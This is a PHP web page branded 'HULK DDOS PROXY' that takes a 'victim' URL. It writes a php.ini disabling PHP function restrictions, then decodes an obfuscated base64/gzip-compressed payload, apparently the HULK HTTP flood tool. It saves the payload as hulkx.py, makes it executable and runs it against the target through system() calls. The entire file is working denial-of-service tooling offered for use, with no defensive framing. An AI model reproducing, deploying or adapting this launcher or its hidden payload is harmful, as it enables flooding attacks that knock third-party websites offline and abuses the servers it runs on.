<?php
$head = '
<html>
<head>
</script>
<title>--==[[VietNam DDOSer TEAM]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border			: solid 2px;
border-color		: #333;
BACKGROUND-COLOR: white;
font: 10pt comic sans ms;
color: black;
}
select {
BORDER-RIGHT:  Black 2px solid;
BORDER-TOP:    #DF0000 1px solid;
BORDER-LEFT:   #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 40%;
color: white;
}
textarea {
border			: dashed 2px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
	SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin			: -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
	COLOR: White; TEXT-DECORATION: none
}
A:visited {
	COLOR: White; TEXT-DECORATION: none
}
A:hover {
	color: Red; TEXT-DECORATION: none
}
A:active {
	color: Red; TEXT-DECORATION: none
}
</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>'; ?>
<html>
	<head>
		<?php 
		echo $head ;
		echo '

<table width="80%" cellspacing="0" cellpadding="0" class="tb1" >

			

       <td width="80%" align=center valign="top" rowspan="1">
            <br><font color=#ff9933 size=6 face="comic sans ms"><b>--==[[ HULK </font><font color=white size=6 face="comic sans ms"><b> DDOS</font><font color=green size=6 face="comic sans ms"><b> PROXY ]]==--</font> 

        <td height="10" align="left" class="td1"></td></tr><tr><td 
        width="80%" align="center" valign="top" rowspan="1"><font 
        color="red" face="comic sans ms"size="1"><b> 
        <font color=#ff9933> 
        #############################################<font color=white>#####################################################</font><font color=green>######################################</font><br><font color=white>-==[[Greetz to]]==--</font><br>  HULK <br>

<font color=white>--==[[Dedicated to]]==--</font>
<br>#CEH.vn</font><br><font color=#ff9933> 
        #############################################<font color=white>#####################################################</font><font color=green>######################################</font>
						
           </table>
        

'; 
?>

<body bgcolor=black><h4 style="text-align:center" ><font color=white>
<div align=center><table width=50%><tr><td><font color=white><marquee behavior="scroll" direction="left" scrollamount="2" scrolldelay="20" width="100%"><span class="footerlink">HULK DDOS PROXY</span></marquee><br></font></td></tr></table><br>hulk-ddos-proxy
<p><a href=<?php echo"?in";?>><u><font color=red>php.ini</font></u></a><br>
<?php
error_reporting(0);
if(isset($_GET['in']))
{
	$htcs  = " disable_functions =none ";
$f = fopen('php.ini','w');


fwrite($f , $htcs);


  
echo "<br \><a href=php.ini><font color=white size=4 face='comic sans ms'><u>link  to php.ini</u></a>";

}
?>
<form method=post><font color=red face="anti-valentine">
vICtIM: http://victim.com<p><input type=text name=web value=><p>
<input type=submit name=sm value="fUCK" >

<?php
error_reporting(0);
if(isset($_POST['sm']))
{
	$web=$_POST['web'];
	$sweb = trim($web);
$te1 = ereg_replace("(https?)://", "", $sweb);
	$te = ereg_replace("www.", "", $te1);
	$finalweb="http://".$te;
	

$hulk=gzinflate(base64_decode('7T1rU9tKlp9DFf+hlxRgX7Asye9wNR5eIWwgMIHcZCqTcbWltt1BVitqydjZmv++p7tlWzYWyIbcmd1yqoKlfpw+70fr9RpHYY8Fb9D781v07vTjFSoYhm6aulHZ3KB9nwUhigLXpW1zcs5HfHIc9gKCHep1Jy0B9hzWn56S6Vjan55wZt+RcHPjNe3AGO4zzyZyBKIc9VkAJz3soRLfRzTc5TAGu+4IYdTGDmIe0aCfBHK0x5BHiINChhzGkba5oYBrnIQO6eDIDQVgFoU5Iw8rdl3Wxi7ycYD7QAmQZ+3ubm70GA/VAVBEAt6KOAlwl3ght75+e12vTXsC0oG1A9luVBqbG3dkdM8CpxUyX7SZ5c2NgPyICA9bNou8kASWoYt/mxsdF3ct+OW4Q8TvW2Qh5hMvt+sHbDjSwmG4C1hSn0PHW02wN5fXuO/SMLf7D0/0vdVsl3GSg0OgD1HPHq+Sy7/Z3HgVEziHAXTMtexZxuaGggGsagnMcgPsJmGINjiTSEMXHE7HCwpmFhQNcCYpk5BfI8FDpJioJk6Y2nIpD2emP+Q79D1s1LAP7HJyu5fsJ3VdXKxoOsp9MYwD9OkAXVAvGqJhvdqqlg8Q8Qqfbg5QMHhjaA3N0Ep5dEbsO1Y0db2hN4wSektBmGxYLGkVrSSYm3nFzxQU/Z7LVeNj9OEWVTVAJIhSF62b5dlFUU77cHqLji8+IlPTtYpeM2v5l8CkopkHyCEFh6yEjDwHZBovgoxky7w4jBlkakZ9BhljBhld08sVvapVy/XMCJUFQjbr+zikbRfYcHlzfgqo6HN8AtRu/oA/DwWh2gDO8eTo9GVkM2ZHHh36vks+k/Z7GhYrJVPQ/f7d7eXFPnLpHVEcyqPjXsD6RJCkmUZDq6Ib3MEBVTOex5D6HEOkrD5ffRYWdBtQB0CJmcCki+NjczGbzr0Ou8ZhTzOflM6VD01FIAFw+W/z8rR4eX5yfYBkM7qkHoXFgKZywzCLdcOUrAuiPLqGOBGCrmhlzagsJYRLbFMvZLwnYV1fHyNoQVc36MtCIRhmRSsvEMJ+zPM8uup7FAYXB5UqaGptKWRuRv02xd7VDbBAEXdDAkp4VQetN9AHdkfxh0alVT87KpYMofdGBZAOWIe6RPKqAHxHx8zr0G4UgCSZVzy+ODkugEGhWUrK4OEWKVOsO9D90pqjL1CZRyxLtgHeWrlkJjVr4nxm2vQlHVI2pKWfhHOh7sM5nX+W7/twK1mQ9Hp1QX7C61X1ml5F7wuXxCUgRhD3UwtejLwh2EBdqwbEBTWF1Oz+/r7w9rIobAbd3FwULi8BEBiJMCkPGoo6eNt6NzvXalX0lXjfUO4au/2rG0UPaYMOFoUQDAz6CD2Fw+CnsRyHHrNEGarm9be+WH97lIIPMcBPmGNlBqtdCpXZjIFW61WUU3lDfl5mhlZNyKwGOljSdXRuk3uCOXGLQql1cMm5EyJMuxCfF3QS2j1jzyWeN1qSUUkvofAElCL+55q3CgRzUWvWvGfCZsJql4gHqSYkcagtcjHKaT9pKtS74yhnCvs++/CpePc2IOTo5gRglApGoQwSF2I/QHV9aFZePKvQ04NodmUAFTdnV3vPPMjiAxYAuFKsvnkktUC0aBWUS+jCCxJ1fApiPb1kbYhD0PM0w8aBvv7A8GNTn0R0MLGSgf4AOCKYGRAQnvSDT9jyw2SzMTVhqMVK4FkuoVQN6ABL+y0XqjCqD4UudAPMG4IvmQeFnep9QUP6cv0gAIzZWqw9HQBmCKfX2JGUH19/Em601DKVJ5hJcOb9RgXyClMweaH3GItBpJplNEbsqFQqt6dJZwxgVed/LjxESNwJnsjQW9VWTWR6BUj2loL7gN2NRQnt2AgrS0T1h9a30NarD/zi2e1R9dF8OVumA+sRh2J0TES9jiBcyqWvOh1qkws6IJAFesQOWSBSqGQH+F67J+u9lVn5dzAPMjxioQj6B2ivF4b+m2JxJJs1GFlss5Av52Fm3UCKCiysiyCfqT5WGBky5JbrmqlXpmoqZi0n7GwbCU9Urs9TX/MF6rFFurRCjVafhuRJqjxfjlUE3ya+GzB4SfJngk5tCdNdoG6LCr+X2duQKUlCPWpJ9TBM05hRjyfrxSMX23dHJAhGdUg0ZTlsZq4A/wAQLDg/AVHU0KdrTWRBxSqAgOqykj28pLi+GeEAxF+xF3M4wF6IjgJoA6f3FYvTtjoTbufbAaJXfsQL54XLA/S3L5/1UtmoLqgnM+NW0mbVPN7DK8xu42l5gWkJLAC8wgvs4Skbqz1tA1nYnGqwk+JBuNSXSLgeEeRhnwTUxujKc6lHJhI0JDvJwNAqD4T9fAM8PkVgIMa4WGuXE7YnBKHLPaU+gyoYarfsptfQwfQqspJrlFawvlrjeRydL3ykKB/bM0nz/mrftLSk68xmqsvb3BljXZdA5lCUO51xUnF/f691xz3j3ELrhX03s+ab8zasx5q/nIo9VUrU56J/1RAJx/xegDG3F2DsOR3eLWR3SUvoxExK8Pbk8qkN2lWkppgscqwxi5L8UWyeehdzySrmsbjaI4Xzi7lk0KynJYOJ2mWSBMrRz8iCe4z9F7pxo8BXiXCssj3i+tpI9Ep9FafFiBdHnODA7hW5mPAc1VuceoLRlJKFLGhfIxGLIHI9c89nvnaqrFo7LU7uHm6+zmtwJhf3fDtqz6va891jAmQj+0WqZS4mmtqM8PWyPs0sJVrPvXqXTQXrM0jU9TKcQprNZhSx/gsWrs0tDKpPINxiuWANAnDHNsozWCx3bSYp1ZlANS1/p5FquTCVycG8rHORkG8IuSOBSOfnlFbhg6TNSQ2uiPRMrsnlHIRDdVqgno0cFiKYj55CkfeYX4Q80O5B1l58ee378y7iz1R0/67r5rLifpwD/9kX8ddXy593tXx9AfZll3r8CtbzZPTiV7CWu6rw793UA8M89bpQ9xdU5DxAuXHMtJlDkkFTThFDDxAcUucNuidtEgZk+BIb/4dXF3BQkwdHEXUdVC6VS5rReNJs5TW7t5GnrnU7kb3s9vZi/UtBSChZtkw4rbKXhb1pVBYa7q/E/KnLws/ZpljYXC3Xl6F90W1bv5Afc6r1kB9nt0e1hYX3f7CQnyTq/7pEa/8PiA9IGAVe7iEP8ur+2/Gdyurm2/gs/dbb6fBX800Tpi6ug5o/rBlppE2Lrx4GkTxS5UwzJMPQ2j4xtrdPzO2m1dX4DzeXrxvbmpYJ6OBO4uCrPVrN7/nNgDiQhdphNqwEMRHHIXPwSIKK6yyIhpEb8qzEQVDDTlfeeS6ma5i5CWgARdy4MWqqHysLcXyW08C21z3XCqIdj9zfS/20jOYOxx1N22eBFrS6Nvzx760m/Ng+/PnR0fbtjsZ4e6fjWx3HtDtlUm9Ucb1mG42dNgUI1boOBz2rXjdfBiWBEZlDaRWEGnP3dC2vVS9LD/VGe1082vth+TaHY+vgpxPsxVL12XC05zNvtNPlLdfq+VpJC5qWplOoQCo6+BC9Wq+JzWC9US1pJYijDa0st4ehSimb4AMM8Cbfzep32aVrttvpabLbuRi9//uoZx59snf89hAwauOBxTzNfJrHTau5mMulekOJvZRB7MClLtP6mLqCRTGL41NAJ6OFeGyAtQD3wQsHCThWO/TOmuAC9KbZjP9aJ3pG8w8i7Z7eUV/cKqGxoFsUZ0UAs904Fl6lfiL+Dut6S7RlBxpb8XSPQzUctEY/Q6tpHdaGjb9pbV6t/ew8H2izFauRuy2ANwF6RqAPxQIqCmeacjNCNk3cBgV5Cp5UfFmYNB8ov8U6nR1uuxSCi+XzkdUs4PaOWkFw9ehQ/tW3T2A1cbonOV/azuVbosOQ3VZdtpry77EaYrQHdnNH+cQdOepI/j2Vf08U2B97Mj7U9RiqaKwqKPK4sjeLRPIYBtWTLWrocWKR5FCFaH28OLQcKTxrCdwqqnuHgUu3Hq68l8ByAu8B3Wm07v1aSmHdKxFnHye5mUrz1LlpkCaZNXBppl4tGZA0meKoIjxZXSuLWw6UbzMaulYrVaC6+g6pVbky49lG4U/z+sfP3uXh8p7tiejRzBTP0r2ScEpSuo2T7eaU3RnNcjamRIHb5NgKdwLISZrfwSZ3SEZAcqO1jakTJfzFR5mZNOMHz7jyvq/b8km8TKiJobPJSfZQmbgFbLV4C6X1nfjfZUslj2JtzFWyd0/aWafNZWPwuwrRrK95bnGAeUgKDOgPHOISr/iTkTv4aarfVkiCflYmBHQwsy0yoOSeBF43PmjKJxMz5b/YpQ4WdwHel2QA7BDiFO0esYFXXZodkHgGshAG2L5Tt9ooGC0faopis5MZjGSXvAdEAPO4K3ET8ABEcdxEwcgx94dNlanDqUWCHc6iwCafPl5kW+o77XJ8P6bb5rwwYcaULcAAmlEo2HG0/igRngPOs/NvxaLoz5/2ZxQ72RgO5oT7MK8feTRU+PRxcEfCZQABHFH59ajvs2WRiDkSMp/TkPRBae0Ad9RNKKKl6FNx8y3h4QqQSQSeOwxBQh5QdM/ugW3Lgng+n8UWLA6IaO7ikPAOizxHGaCwmuUghcTuhQOtT0ONONEKnI54GIDMtXCwipiIswL1ncjzRn3cxyvMpeJGasqWnPWdtbkWwH+xoDhZlsu4S70O08Sj4YJfJOxjfwVpyVCP2RCPnEgFfG3gFSG758XBWBMzFW/CVn0XPEbC43DwrWQVIdrkB0hyiEEf2aD417+KhsLycALiOHQVs5RcAYtuR6MQxoZxtCMDsXW2rAcbmxb8Moh5mMMMN+yJ5hUEJhXHJdRhfAXC5Oy2y1i/TYKV87tFHi9zeOlTF9JoWz6xsCz9YwQ8v/99FfLFXDIQ27Q2eNwe16K7FSDwHoRGr/djBQRGYd9bxUGtE4d14rBOHNaJwzpxWCcO68RhnTisE4d14rBOHNaJwzpxWCcO68RhnTisE4d14rBOHNaJwzpxWCcO68RhnTj8wsRh7pby8fS8uqE8vuEIGaa6pXz85usHt5QnXokNjYmzCR6cDOWCi/o+sjb10GeQD8V9njrsMwtcBx1HfuoIGyNOkUtQwGjqoNM2c3EztfsSgzPhFKNDGoibWjh669JuL0Slmp466fDiRrwVAh1F4l3k6LiHQde8Lkmd8NaFoxE6ooGTOuaYeXaPhhh9jgIepg47vzm/SV8nYD+Jl9qti5eIMlhFPP8AdoGu3FHfp3a6EOh1j3npdN2AAMGfozPg4nCEbiqpIz+QYcRRNV0OLGTo7MmFPrCQoHLqsIszdFZK7f3SZkN09Qg5h+L5U/RZvF4tnRDxDl/0JV0+PnaEMqUO6GCbtBm7Sx2APQZZAot40mQTA0UrmGtbPNHC43fyI8xtShGEaHmXoLBe2Q8+2L7LcfqTSPtlUdiCMchC4mX4rzosQBSBMQKQLsnp+2gy8hWGQQq2Jn5AX3LVyj5q6GL5CaA9C9m9IIcTmMZdyqcIfzR+Wb1CS7TYYC+5KFBvo59/a7yEJP3StGHWE0GDeOpQvGH/Fe2Ibxho8q33ua3mVv4vukRffgGg9Z2BSQtyt3a2oJW4nCzsbW5tTt6gD+fxVxG0j6pFoIr20MykvSR/5/hU2jf0fB6G7Fq7GQbmp2tr2HFayjvndj8BYwqHgjO7+2NR2D1GbbLomaA0KMfY7pECOJcQ0gIAtOuxgi3adtNmHNo28cMCeLWAE7E2+JyrQr1eaRSM/SjsFOoHPyxdq+3/pn5TAX1UYkzFfhJ+9mb7k7qeBvs9IX7h0KUDMgU/Zqth6PuGqaezRL1YEeoOQdydgIQlpLQJ7xg45H1xA6UY8doHIwvRrrCVN2h3D5Q9B+4/R32Qwp74joPQS3EX7UMT0vfHIwtGEpaM27t70PFVzvx2AJ3yoxEJdbwW5+8AEiQ2uf+Rc3bfTKf8K/8604xZZgtc/iVQESm+tIbxZKm3LdWck5D3x13vbm+vY7Bi6riZQo0Apj2eo37y4KxehcFIGt5kKPzKL2PE7JZOBYw5J79GYRn5N9PPVuiTTmn1VkXXoXviAchQqCtKonYaBCzYR8rWxzwWtYJDZMsEtKFAx0L4KL9Vwgk6hoEIltmVvXKlivi+xxTY1k2IgxC9Qdt8C23Lj5totvibUxBlA3dBtXLVGP/xzFPPSZs3R8qnjxcJSiZkQNXKmacIGXGNDKnyiRPv9mrmqyFPsT1224LKhM8WLhq0QX0DZnPDdjHnSPD2VrbkJh+H0VSDdOXyOcTIy3HidlQUmcj9vide8iiY/rupWhRfZ8KBageXnpA02kE5+ZCKUAo1YCo/U06J2XYqf8CqgV9DNdQHrFVu22cehTKRy/gTk8URqDCSjOLjIMXHtF6qCcuR6weQ9kPkth5+nyXBAcvSYzkBpeMpe4au/z43TRI/HvD7X+Z7Y3bEerXtoBGJQHAR6kYUOVQoWG5+znhKOp4CK4WlObvAPzx0i/tIFPBbkqlkSOwI8rHNDZgi/JpQRxx0B3n0OzJVbIfoJFUwqaljRYVZ4xlfjW+WtSWehtiSi04npuh4jFOhgN59uniPTs4GJsq9H/Uvvnt3qDD55FEeUPZAxJA6FgoiyL+aR9WyUGkijQk6pkBHqN1WzIPpR3EkepAQWEnkY8iJVKS4lZ9wUA1XWQR0iLa+iA0k3kxTdds/oHDLff1n8dtv+WJT+w1i09gmROSB8X2tG7DIj73WXPImvaLyPTA0YamxQ9K48FjqTIyY1W/VPB3zvw=='));

$hulk_file=fopen('hulkx.py','w');
fwrite($hulk_file,$hulk);
$hulkf='hulkx.py';
$ch="chmod +x ".$hulkf ;
            system($ch);
           
            $z="python ".$hulkf." ".$finalweb;
            system($z);


}



?>